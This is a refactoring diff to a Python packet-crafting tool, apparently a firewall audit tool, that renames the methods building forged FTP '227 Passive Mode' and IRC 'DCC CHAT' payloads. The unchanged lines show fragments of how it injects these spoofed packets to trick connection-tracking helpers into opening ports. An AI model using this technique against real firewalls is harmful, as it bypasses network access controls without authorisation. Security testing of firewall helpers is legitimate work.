@@ -35,7 +35,7 @@ class attack_target:
         self.verbose = False
 
 class ftp_helper(attack_target):
-    def build_227_command(self):
+    def build_command(self):
         return "227 Entering Passive Mode (%s,%d,%d)\r\n" % (self.ip.replace('.',','), self.port >> 8 & 0xff, self.port & 0xff)
 
     def build_filter(self):
@@ -58,7 +58,7 @@ class ftp_helper(attack_target):
             del att[IP].len
             att[TCP].seq = pkt[TCP].seq + len(pkt[TCP].payload)
             del att[TCP].chksum
-            att[TCP].payload = self.build_227_command()
+            att[TCP].payload = self.build_command()
             # send packet
             if self.verbose:
                 print "Sending attack packet"
@@ -103,7 +103,7 @@ class irc_helper(attack_target):
         while ip:
             ipn=(ipn<<8)+int(ip.pop(0))
         return ipn
-    def build_dcc_command(self):
+    def build_command(self):
         return 'PRIVMSG opensvp :\x01DCC CHAT CHAT %d %d\x01\r\n' % (self.ipnumber(self.ip), self.port)
     def build_filter(self):
         return "tcp and src host %s and dst port 6667" % (self.ip)
@@ -125,7 +125,7 @@ class irc_helper(attack_target):
             del att[IP].len
             att[TCP].seq = pkt[TCP].seq + len(pkt[TCP].payload)
             del att[TCP].chksum
-            att[TCP].payload = self.build_dcc_command()
+            att[TCP].payload = self.build_command()
             # send packet
             if self.verbose:
                 print "Sending attack packet"
